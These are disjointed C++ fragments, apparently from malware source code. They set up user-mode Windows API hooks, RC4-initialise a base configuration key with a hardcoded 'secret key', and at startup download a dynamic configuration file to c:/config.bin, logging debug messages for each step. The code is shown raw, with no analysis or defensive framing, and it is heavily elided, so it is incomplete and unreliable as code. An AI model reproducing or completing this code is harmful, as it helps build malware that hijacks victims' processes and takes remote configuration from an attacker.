...
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if(BO_DEBUG == 2)
...
#   endif
    if( WinApiTables::_setUserHooks() )
		OutputDebugString(L"hooks ok");
	else
		OutputDebugString(L"hooks false");
  }
...
{
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if(BO_DEBUG == 0)
...
void Core::getPeSettings(PESETTINGS *ps)
{
  BASECONFIG baseConfig;
  getBaseConfig(&baseConfig);
  Crypt::_rc4Init( "secret key", 10, &baseConfig.baseKey );
...
void WINAPI Start()
{
	...
	if( defaultModuleEntry() )
		OutputDebugString(L"init ok");
	else
		OutputDebugString(L"init false");
	if(	DynamicConfig::download_file("c:/config.bin") )
		OutputDebugString(L"load ok");
	else
		OutputDebugString(L"load false");
